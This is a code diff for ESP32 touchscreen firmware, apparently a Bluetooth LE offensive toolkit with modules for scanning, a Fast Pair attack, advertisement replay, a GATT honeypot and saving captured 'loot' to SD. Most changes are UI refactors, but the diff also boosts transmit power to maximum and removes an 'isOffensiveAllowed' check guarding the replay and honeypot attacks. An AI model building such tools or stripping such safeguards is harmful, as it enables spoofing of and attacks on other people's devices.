-    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, WONTHOUND_HOTPINK);
-
-    // Scan status text next to play icon
-    tft.setTextSize(1);
-    tft.fillRect(SCALE_X(35), ICON_BAR_Y + 2, SCALE_W(18), 10, WONTHOUND_GUNMETAL);
-    if (scanning) {
-        tft.setTextColor(WONTHOUND_MAGENTA, WONTHOUND_GUNMETAL);
-        tft.setCursor(SCALE_X(35), ICON_BAR_Y + 3);
-        tft.print("ON");
-    } else {
-        tft.setTextColor(WONTHOUND_GUNMETAL, WONTHOUND_GUNMETAL);
-    }
+    whDrawBackButton();
+    WhRect a[4];
+    whTopBarActions(4, a);
+    whTopBtn(a[0], scanning ? "STOP" : "SCAN", scanning ? WH_ON : WH_ACCENT);
+    whTopBtn(a[1], "FILT<", WH_OUTLINE);
+    whTopBtn(a[2], "FILT>", WH_OUTLINE);
+    whTopBtn(a[3], "INFO", WH_OUTLINE);
 }
 
 static void drawHeader() {
@@ -6971,59 +7115,51 @@ static void handleTouch() {
         return;
     }
 
-    // ── Icon bar ────────────────────────────────────────────────────────
-    if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM) {
-        for (int i = 0; i < BSNIFF_ICON_NUM; i++) {
-            if (tx >= bsniffIconX[i] && tx < bsniffIconX[i] + BSNIFF_ICON_SIZE + SCALE_X(10)) {
-                switch (i) {
-                    case 0:  // Back
-                        exitRequested = true;
-                        waitForRelease = true;
-                        return;
-                    case 1:  // Scan toggle
-                        if (scanning) {
-                            scanning = false;
-                            if (pBleScan) pBleScan->stop();
-                        } else {
-                            scanning = true;
-                            if (pBleScan) pBleScan->start(5, scanCompleteCallback, false);
-                        }
-                        waitForRelease = true;
-                        drawIconBar();
-                        drawStatsLine();
-                        return;
-                    case 2:  // Filter left
-                        currentFilter = (SniffFilter)((currentFilter + FILT_COUNT - 1) % FILT_COUNT);
-                        listStartIndex = 0;
-                        currentIndex = 0;
-                        waitForRelease = true;
-                        drawHeader();
-                        drawDeviceList();
-                        drawStatsLine();
-                        drawButtonBar();
-                        return;
-                    case 3:  // Filter right
-                        currentFilter = (SniffFilter)((currentFilter + 1) % FILT_COUNT);
-                        listStartIndex = 0;
-                        currentIndex = 0;
-                        waitForRelease = true;
-                        drawHeader();
-                        drawDeviceList();
-                        drawStatsLine();
-                        drawButtonBar();
-                        return;
-                    case 4:  // Eye/detail
-                        if (deviceCount > 0) {
-                            showDeviceDetail(currentIndex);
-                            waitForRelease = true;
-                        }
-                        return;
-                    case 5:  // BLE pulse (indicator only — no action)
-                        return;
-                }
+    // ── Top control bar: dedicated Back + 4 spread actions (none in Back zone) ──
+    {
+        WhRect a[4];
+        whTopBarActions(4, a);
+        if (whHit(tx, ty, whBackButtonRect())) {          // Back
+            waitForRelease = true;
+            exitRequested = true;
+            return;
+        } else if (whHit(tx, ty, a[0])) {                 // Scan toggle
+            waitForRelease = true;
+            if (scanning) {
+                scanning = false;
+                if (pBleScan) pBleScan->stop();
+            } else {
+                scanning = true;
+                if (pBleScan) pBleScan->start(5, scanCompleteCallback, false);
             }
+            drawIconBar();
+            drawStatsLine();
+            return;
+        } else if (whHit(tx, ty, a[1])) {                 // Filter left
+            waitForRelease = true;
+            currentFilter = (SniffFilter)((currentFilter + FILT_COUNT - 1) % FILT_COUNT);
+            listStartIndex = 0;
+            currentIndex = 0;
+            drawHeader();
+            drawDeviceList();
+            drawStatsLine();
+            drawButtonBar();
+            return;
+        } else if (whHit(tx, ty, a[2])) {                 // Filter right
+            waitForRelease = true;
+            currentFilter = (SniffFilter)((currentFilter + 1) % FILT_COUNT);
+            listStartIndex = 0;
+            currentIndex = 0;
+            drawHeader();
+            drawDeviceList();
+            drawStatsLine();
+            drawButtonBar();
+            return;
+        } else if (whHit(tx, ty, a[3])) {                 // Detail
+            waitForRelease = true;
+            if (deviceCount > 0) showDeviceDetail(currentIndex);
+            return;
         }
-        return;
     }
 
     // ── Device list area: tap to select ──────────────────────────────────
@@ -7117,7 +7253,7 @@ void setup() {
 
     // BLE init
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);  // Race condition fix — BLE controller needs time
 
     pBleScan = BLEDevice::getScan();
@@ -7628,7 +7764,7 @@ static void wpDoScan() {
         BLEUUID sdUUID = device.getServiceDataUUID();
         if (!sdUUID.equals(BLEUUID((uint16_t)0xFE2C))) continue;
 
-        std::string sd = device.getServiceData();
+        std::string sd = whToStdString(device.getServiceData());
         if (sd.length() < 3) continue;
 
         // Check duplicate MAC
@@ -8116,7 +8252,7 @@ static void wpSaveLoot() {
     spiDeselect();
     SPI.end();
     delay(10);
-    SPI.begin(18, 19, 23);
+    SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
     pinMode(SD_CS, OUTPUT);
     digitalWrite(SD_CS, HIGH);
     delay(10);
@@ -8124,7 +8260,7 @@ static void wpSaveLoot() {
     if (!SD.begin(SD_CS, SPI, 4000000)) {
         SPI.end();
         delay(50);
-        SPI.begin(18, 19, 23);
+        SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
         if (!SD.begin(SD_CS, SPI, 4000000)) {
             #if CYD_DEBUG
             Serial.printf("[WP-SAVE] SD FAILED — heap: %u\n", ESP.getFreeHeap());
@@ -8281,7 +8417,7 @@ static void wpRunAttack() {
         delay(300);
 
         releaseClassicBtMemory();
-        BLEDevice::init("");
+        wh_ble_init_max_power("");
         delay(150);
 
         pWpScan = BLEDevice::getScan();
@@ -8498,7 +8634,7 @@ static void wpRunAttack() {
     // Model ID char
     BLERemoteCharacteristic* pMid = pSvc->getCharacteristic(uuidModelId);
     if (pMid && pMid->canRead()) {
-        std::string mv = pMid->readValue();
+        std::string mv = whToStdString(pMid->readValue());
         if (mv.length() >= 3) {
             memcpy(wpAtkResult.modelIdBytes, mv.data(), 3);
             wpAtkResult.hasModelId = true;
@@ -8520,7 +8656,7 @@ static void wpRunAttack() {
     if (pDis) {
         BLERemoteCharacteristic* pFw = pDis->getCharacteristic(uuidFwRev);
         if (pFw && pFw->canRead()) {
-            std::string fv = pFw->readValue();
+            std::string fv = whToStdString(pFw->readValue());
             if (fv.length() > 0) {
                 size_t copyLen = fv.length();
                 if (copyLen > 19) copyLen = 19;
@@ -8572,7 +8708,7 @@ void setup() {
     delay(50);
 
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     pWpScan = BLEDevice::getScan();
@@ -9515,7 +9651,7 @@ class PredatorCallbacks : public BLEAdvertisedDeviceCallbacks {
 
         // Manufacturer data
         if (advertisedDevice.haveManufacturerData()) {
-            std::string mfg = advertisedDevice.getManufacturerData();
+            std::string mfg = whToStdString(advertisedDevice.getManufacturerData());
             S->pendingMfgLen = mfg.length() > 8 ? 8 : mfg.length();
             memcpy(S->pendingMfgData, mfg.data(), S->pendingMfgLen);
         } else {
@@ -9635,7 +9771,7 @@ static void predReplayTask(void* param) {
 
 static void startReplayTask() {
     if (S->replayTaskHandle != NULL) return;
-    xTaskCreatePinnedToCore(predReplayTask, "blePred", 4096, NULL, 1, &S->replayTaskHandle, 0);
+    xTaskCreatePinnedToCore(predReplayTask, "blePred", 8192, NULL, 1, &S->replayTaskHandle, 0);  // 8192 to match working spoofer/beacon — 4096 overflows the NimBLE adv call chain on C5
 }
 
 static void stopReplayTask() {
@@ -9683,11 +9819,11 @@ static void startReplay() {
 
     // Re-init for advertising
     releaseClassicBtMemory();
-    BLEDevice::init("WontHound");
+    wh_ble_init_max_power("WontHound");
     delay(150);
 
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P21);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
 
     S->replaying = true;
     S->replayCount = 0;
@@ -9717,7 +9853,7 @@ static void stopReplay() {
     delay(100);
 
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     S->pScan = BLEDevice::getScan();
@@ -9863,7 +9999,7 @@ static void startRecon() {
 
     // Re-init BLE for GATT client mode
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     drawReconStatus(1, "Connecting...", WONTHOUND_HOTPINK);
@@ -9917,7 +10053,7 @@ static void startRecon() {
 
         // Go back to TARGET view
         releaseClassicBtMemory();
-        BLEDevice::init("");
+        wh_ble_init_max_power("");
         delay(150);
         S->pScan = BLEDevice::getScan();
         if (S->pScan) {
@@ -9952,7 +10088,7 @@ static void startRecon() {
         delay(2000);
 
         releaseClassicBtMemory();
-        BLEDevice::init("");
+        wh_ble_init_max_power("");
         delay(150);
         S->pScan = BLEDevice::getScan();
         if (S->pScan) {
@@ -9982,17 +10118,7 @@ static void startRecon() {
         memset(si, 0, sizeof(HpServiceInfo));
         si->charStart = S->hpCharCount;
 
-        // Extract UUID (16-bit or 128-bit)
-        {
-            esp_bt_uuid_t* native = svcUUID.getNative();
-            if (native->len == ESP_UUID_LEN_16) {
-                si->uuid16 = native->uuid.uuid16;
-            } else if (native->len == ESP_UUID_LEN_128) {
-                memcpy(si->uuid128, native->uuid.uuid128, 16);
-            } else if (native->len == ESP_UUID_LEN_32) {
-                si->uuid16 = (uint16_t)(native->uuid.uuid32 & 0xFFFF);
-            }
-        }
+        whCopyBleUuidForProfile(svcUUID, si->uuid16, si->uuid128);
 
         // Get characteristics for this service
         std::map<std::string, BLERemoteCharacteristic*>* charMap = pSvc->getCharacteristics();
@@ -10007,17 +10133,7 @@ static void startRecon() {
                 memset(ci, 0, sizeof(HpCharInfo));
                 ci->svcIdx = S->hpSvcCount;
 
-                // Extract char UUID
-                {
-                    esp_bt_uuid_t* cNative = charUUID.getNative();
-                    if (cNative->len == ESP_UUID_LEN_16) {
-                        ci->uuid16 = cNative->uuid.uuid16;
-                    } else if (cNative->len == ESP_UUID_LEN_128) {
-                        memcpy(ci->uuid128, cNative->uuid.uuid128, 16);
-                    } else if (cNative->len == ESP_UUID_LEN_32) {
-                        ci->uuid16 = (uint16_t)(cNative->uuid.uuid32 & 0xFFFF);
-                    }
-                }
+                whCopyBleUuidForProfile(charUUID, ci->uuid16, ci->uuid128);
 
                 // Build properties byte from canRead/canWrite/canNotify helpers
                 ci->properties = 0;
@@ -10030,7 +10146,7 @@ static void startRecon() {
                 // Read cached value if readable
                 if (ci->properties & ESP_GATT_CHAR_PROP_BIT_READ) {
                     try {
-                        std::string val = pChar->readValue();
+                        std::string val = whToStdString(pChar->readValue());
                         ci->cachedValLen = (val.length() > HP_MAX_READ_VAL) ? HP_MAX_READ_VAL : val.length();
                         if (ci->cachedValLen > 0) {
                             memcpy(ci->cachedVal, val.c_str(), ci->cachedValLen);
@@ -10107,7 +10223,7 @@ static void handleReconTouch() {
     bpWaitForRelease = true;
 
     // Icon bar back → abort RECON
-    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
+    if (ty <= ICON_BAR_TOUCH_BOTTOM) {   // full-height big-button top bar
         // RECON is synchronous so this handler only runs between phases.
         // If we get here, RECON must have completed — just go back.
         goBackToListen();
@@ -10526,11 +10642,11 @@ static void startHoneypot() {
 
     // Re-init BLE for GATTS server — empty name to avoid leaking identity
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P21);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
 
     S->hpActive = true;
     S->hpAdvStarted = false;
@@ -10573,7 +10689,7 @@ static void stopHoneypot() {
 
     // Re-init for scanning
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     S->pScan = BLEDevice::getScan();
@@ -10822,7 +10938,7 @@ static void hpSaveLootToSD() {
     // Init SD card (same pattern as WhisperPair)
     SPI.end();
     delay(10);
-    SPI.begin(18, 19, 23);
+    SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
     pinMode(SD_CS, OUTPUT);
     digitalWrite(SD_CS, HIGH);
     delay(10);
@@ -10830,7 +10946,7 @@ static void hpSaveLootToSD() {
     if (!SD.begin(SD_CS, SPI, 4000000)) {
         SPI.end();
         delay(50);
-        SPI.begin(18, 19, 23);
+        SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
         if (!SD.begin(SD_CS, SPI, 4000000)) {
             hpSetStatus("SD card not found!", 0xF800);
             SD.end();
@@ -10968,7 +11084,7 @@ static void handleHoneypotTouch() {
     bpWaitForRelease = true;
 
     // Icon bar back → stop honeypot
-    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
+    if (ty <= ICON_BAR_TOUCH_BOTTOM) {   // full-height big-button top bar
         stopHoneypot();
         return;
     }
@@ -11018,41 +11134,42 @@ static void handleHoneypotTouch() {
 // UI DRAWING — ICON BAR
 // ═══════════════════════════════════════════════════════════════════════════
 
+// One big control-bar button in column i of n (matches the phase touch columns).
+static void bpBtn(int i, int n, const char* label, const unsigned char* icon, bool on, bool accent) {
+    const int barH = SCALE_Y(38);
+    int bx = SCREEN_WIDTH * i / n;
+    int bw = SCREEN_WIDTH * (i + 1) / n - bx;
+    uint16_t fill   = on ? WONTHOUND_HOTPINK : WONTHOUND_DARK;
+    uint16_t border = on ? TFT_WHITE : (accent ? WONTHOUND_HOTPINK : WONTHOUND_MAGENTA);
+    uint16_t fg     = on ? TFT_WHITE : (accent ? WONTHOUND_HOTPINK : WONTHOUND_MAGENTA);
+    tft.fillRoundRect(bx + 2, 2, bw - 4, barH - 4, 6, fill);
+    tft.drawRoundRect(bx + 2, 2, bw - 4, barH - 4, 6, border);
+    if (icon) tft.drawBitmap(bx + bw / 2 - 8, 4, icon, 16, 16, fg);
+    tft.setTextFont(1);
+    tft.setTextSize(1);
+    tft.setTextDatum(MC_DATUM);
+    tft.setTextColor(fg);
+    tft.drawString(label, bx + bw / 2, barH - 7);
+    tft.setTextDatum(TL_DATUM);
+}
+
+// Phase-aware control bar: dedicated Back (owns the fixed back zone) + phase
+// action buttons spread clear of it.
 static void drawIconBar() {
-    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, WONTHOUND_MAGENTA);
-    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, WONTHOUND_GUNMETAL);
-
-    // Back (always)
-    tft.drawBitmap(SCALE_X(10), ICON_BAR_Y, bitmap_icon_go_back, 16, 16, WONTHOUND_MAGENTA);
-
+    whDrawBackButton();
     if (S->phase == PHASE_LISTEN) {
-        // Pause/Resume
-        tft.drawBitmap(SCALE_X(55), ICON_BAR_Y, bitmap_icon_start, 16, 16,
-                       S->scanning ? WONTHOUND_MAGENTA : WONTHOUND_GUNMETAL);
-        // Filter left
-        tft.drawBitmap(SCALE_X(100), ICON_BAR_Y, bitmap_icon_LEFT, 16, 16, WONTHOUND_MAGENTA);
-        // Filter right
-        tft.drawBitmap(SCALE_X(135), ICON_BAR_Y, bitmap_icon_RIGHT, 16, 16, WONTHOUND_MAGENTA);
-        // Speed
-        tft.drawBitmap(SCALE_X(175), ICON_BAR_Y, bitmap_icon_signal, 16, 16, WONTHOUND_VIOLET);
-        // BLE indicator
-        tft.drawBitmap(SCALE_X(215), ICON_BAR_Y, bitmap_icon_ble, 16, 16,
-                       S->scanning ? WONTHOUND_MAGENTA : WONTHOUND_GUNMETAL);
-    } else if (S->phase == PHASE_TARGET) {
-        // Only back icon — handled above
+        WhRect a[4];
+        whTopBarActions(4, a);
+        whTopBtn(a[0], S->scanning ? "STOP" : "SCAN", S->scanning ? WH_ON : WH_ACCENT);
+        whTopBtn(a[1], "FILT<", WH_OUTLINE);
+        whTopBtn(a[2], "FILT>", WH_OUTLINE);
+        whTopBtn(a[3], "SPD", WH_OUTLINE);
     } else if (S->phase == PHASE_ATTACK) {
-        // Stop
-        tft.drawBitmap(SCALE_X(55), ICON_BAR_Y, bitmap_icon_start, 16, 16, WONTHOUND_HOTPINK);
-        // Speed cycle
-        tft.drawBitmap(SCALE_X(100), ICON_BAR_Y, bitmap_icon_signal, 16, 16, WONTHOUND_VIOLET);
-    } else if (S->phase == PHASE_RECON) {
-        // Only back icon during RECON (abort)
-    } else if (S->phase == PHASE_HONEYPOT) {
-        // Stop icon
-        tft.drawBitmap(SCALE_X(55), ICON_BAR_Y, bitmap_icon_start, 16, 16, WONTHOUND_HOTPINK);
+        WhRect a[1];
+        whTopBarActions(1, a);
+        whTopBtn(a[0], "SPEED", WH_OUTLINE);   // Back button stops the replay
     }
-
-    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, WONTHOUND_HOTPINK);
+    // HONEYPOT / TARGET / RECON: Back only — a tap anywhere in the strip aborts.
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -11395,7 +11512,7 @@ static void drawTargetOverlay() {
     // Save for touch detection
     S->targetBtnY = btnY;
 
-    bool canAttack = ::isOffensiveAllowed() && d->payloadLen > 0;
+    bool canAttack = d->payloadLen > 0;
     uint16_t atkColor = canAttack ? WONTHOUND_HOTPINK : WONTHOUND_GUNMETAL;
 
     // REPLAY button — same behavior as old ATTACK
@@ -11609,21 +11726,17 @@ static void handleListenTouch() {
     if (millis() - S->lastIconTap < 350) return;
     S->lastIconTap = millis();
 
-    // ── Icon bar — equal zones for reliable touch on all screens ─────────
-    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
-        bpWaitForRelease = true;
-
-        // 5 icon zones: Back | Scan | FilterL | FilterR | Speed
-        // BLE indicator (rightmost) is display-only, no touch action
-        int zw = SCREEN_WIDTH / 5;
-
-        // Back (zone 0)
-        if (tx < zw) {
+    // ── Top control bar: dedicated Back + 4 spread actions (none in Back zone) ──
+    {
+        WhRect a[4];
+        whTopBarActions(4, a);
+        if (whHit(tx, ty, whBackButtonRect())) {          // Back
+            bpWaitForRelease = true;
             S->exitRequested = true;
             return;
         }
-        // Scan toggle (zone 1)
-        if (tx >= zw && tx < zw * 2) {
+        if (whHit(tx, ty, a[0])) {                         // Scan toggle
+            bpWaitForRelease = true;
             if (S->scanning) {
                 S->scanning = false;
                 if (S->pScan) S->pScan->stop();
@@ -11634,30 +11747,29 @@ static void handleListenTouch() {
             drawIconBar();
             return;
         }
-        // Filter left (zone 2)
-        if (tx >= zw * 2 && tx < zw * 3) {
+        if (whHit(tx, ty, a[1])) {                         // Filter left
+            bpWaitForRelease = true;
             S->filter = (PredFilter)((S->filter + PF_COUNT - 1) % PF_COUNT);
             S->listStartIndex = 0;
             S->currentIndex = 0;
             drawDeviceList();
             return;
         }
-        // Filter right (zone 3)
-        if (tx >= zw * 3 && tx < zw * 4) {
+        if (whHit(tx, ty, a[2])) {                         // Filter right
+            bpWaitForRelease = true;
             S->filter = (PredFilter)((S->filter + 1) % PF_COUNT);
             S->listStartIndex = 0;
             S->currentIndex = 0;
             drawDeviceList();
             return;
         }
-        // Speed (zone 4)
-        if (tx >= zw * 4) {
+        if (whHit(tx, ty, a[3])) {                         // Speed
+            bpWaitForRelease = true;
             S->dwellIndex = (S->dwellIndex + 1) % BP_DWELL_COUNT;
             S->replayDwellMs = dwellPresets[S->dwellIndex];
-            drawDeviceList();  // Refresh stats line showing dwell
+            drawDeviceList();
             return;
         }
-        return;
     }
 
     // ── Device list area ──────────────────────────────────────────────────
@@ -11745,7 +11857,7 @@ static void handleTargetTouch() {
     bpWaitForRelease = true;
 
     // Icon bar back → return to LISTEN (NOT exit module)
-    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
+    if (ty <= ICON_BAR_TOUCH_BOTTOM) {   // full-height big-button top bar
         goBackToListen();
         return;
     }
@@ -11758,8 +11870,6 @@ static void handleTargetTouch() {
     if (ty >= btnY - 5 && ty <= btnY + btnH) {
         // Left zone → REPLAY
         if (tx < zoneW) {
-            if (!::isOffensiveAllowed()) return;
-
             int realIdx = bpFilteredToReal(S->detailIdx);
             if (realIdx < 0) return;
             ReconDevice* d = &S->devices[realIdx];
@@ -11775,8 +11885,6 @@ static void handleTargetTouch() {
 
         // Center zone → HONEYPOT
         if (tx >= zoneW && tx < zoneW * 2) {
-            if (!::isOffensiveAllowed()) return;
-
             int realIdx = bpFilteredToReal(S->detailIdx);
             if (realIdx < 0) return;
             ReconDevice* d = &S->devices[realIdx];
@@ -11811,21 +11919,23 @@ static void handleAttackTouch() {
     S->lastIconTap = millis();
     bpWaitForRelease = true;
 
-    // Icon bar — 3-zone: Back/Stop | Speed | (unused)
-    if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
-        // Left half → stop replay (Back + Stop both do same thing)
-        if (tx < SCREEN_WIDTH / 2) {
+    // Top bar: dedicated Back (= stop replay) + one SPEED action clear of it.
+    {
+        WhRect a[1];
+        whTopBarActions(1, a);
+        if (whHit(tx, ty, whBackButtonRect())) {   // Back / Stop
             stopReplay();
             return;
         }
-        // Right half → speed cycle
-        S->dwellIndex = (S->dwellIndex + 1) % BP_DWELL_COUNT;
-        S->replayDwellMs = dwellPresets[S->dwellIndex];
-        tft.setTextSize(1);
-        tft.setTextColor(WONTHOUND_MAGENTA, WONTHOUND_BLACK);
-        tft.setCursor(5, SCALE_Y(108));
-        tft.printf("DWELL: %dms    ", S->replayDwellMs);
-        return;
+        if (whHit(tx, ty, a[0])) {                  // Speed cycle
+            S->dwellIndex = (S->dwellIndex + 1) % BP_DWELL_COUNT;
+            S->replayDwellMs = dwellPresets[S->dwellIndex];
+            tft.setTextSize(1);
+            tft.setTextColor(WONTHOUND_MAGENTA, WONTHOUND_BLACK);
+            tft.setCursor(5, SCALE_Y(108));
+            tft.printf("DWELL: %dms    ", S->replayDwellMs);
+            return;
+        }
     }
 }
 
@@ -11866,7 +11976,7 @@ void setup() {
 
     // BLE init
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     S->pScan = BLEDevice::getScan();
@@ -12428,7 +12538,7 @@ static void fyProcessResults(BLEScanResults& results) {
 
         // ── 3. MANUFACTURER ID CHECK ──
         if (device.haveManufacturerData()) {
-            std::string mfgData = device.getManufacturerData();
+            std::string mfgData = whToStdString(device.getManufacturerData());
             if (mfgData.length() >= 2) {
                 uint16_t companyId = (uint8_t)mfgData[0] | ((uint8_t)mfgData[1] << 8);
                 if (companyId == FY_MFR_XUNTONG) {
@@ -12934,7 +13044,7 @@ static void fySaveLoot() {
     // Init SD card (same pattern as BlePredator)
     SPI.end();
     delay(10);
-    SPI.begin(18, 19, 23);
+    SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
     pinMode(SD_CS, OUTPUT);
     digitalWrite(SD_CS, HIGH);
     delay(10);
@@ -12942,13 +13052,13 @@ static void fySaveLoot() {
     if (!SD.begin(SD_CS, SPI, 4000000)) {
         SPI.end();
         delay(50);
-        SPI.begin(18, 19, 23);
+        SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
         if (!SD.begin(SD_CS, SPI, 4000000)) {
             fySetStatus("SD card not found!", 0xF800);
             SD.end();
             // Re-init BLE
             releaseClassicBtMemory();
-            BLEDevice::init("");
+            wh_ble_init_max_power("");
             delay(150);
             pFyScan = BLEDevice::getScan();
             if (pFyScan) {
@@ -12974,7 +13084,7 @@ static void fySaveLoot() {
         fySetStatus("File write failed!", 0xF800);
         SD.end();
         releaseClassicBtMemory();
-        BLEDevice::init("");
+        wh_ble_init_max_power("");
         delay(150);
         pFyScan = BLEDevice::getScan();
         if (pFyScan) {
@@ -13059,7 +13169,7 @@ static void fySaveLoot() {
 
     // Re-init BLE
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
     pFyScan = BLEDevice::getScan();
     if (pFyScan) {
@@ -13122,7 +13232,7 @@ static void fyHandleTouch() {
                 // Re-init BLE if needed
                 if (!pFyScan) {
                     releaseClassicBtMemory();
-                    BLEDevice::init("");
+                    wh_ble_init_max_power("");
                     delay(150);
                     pFyScan = BLEDevice::getScan();
                     if (pFyScan) {
@@ -13219,7 +13329,7 @@ void setup() {
     delay(50);
 
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     pFyScan = BLEDevice::getScan();
